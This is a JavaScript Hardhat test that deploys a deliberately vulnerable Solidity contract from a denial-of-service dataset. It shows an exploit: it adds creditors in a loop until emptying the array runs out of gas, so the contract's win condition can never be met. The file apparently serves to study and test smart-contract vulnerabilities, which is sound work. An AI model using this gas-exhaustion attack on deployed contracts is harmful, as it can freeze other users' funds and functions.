const { loadFixture, mine } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe('attack denial_of_service/dos_address.sol', function () {
    async function deployContracts() {

        const DosGas = await ethers.getContractFactory('contracts/dataset/denial_of_service/dos_address.sol:DosGas');
        const victim = await DosGas.deploy();
        await victim.waitForDeployment();

    return {victim};
    }

  
    it('exploit denial of service vulnerability', async function () {
        const {victim} = await loadFixture(deployContracts);

        // add enough creditors to make the contract run out of gas when emptying the creditors array
        for (let i = 0; i < 17; i++) {
            await victim.addCreditors();
        }
        
        await expect(victim.emptyCreditors()).to.be.reverted;

        // win never gets to be true
        expect(await victim.iWin()).to.be.false;

    });
  });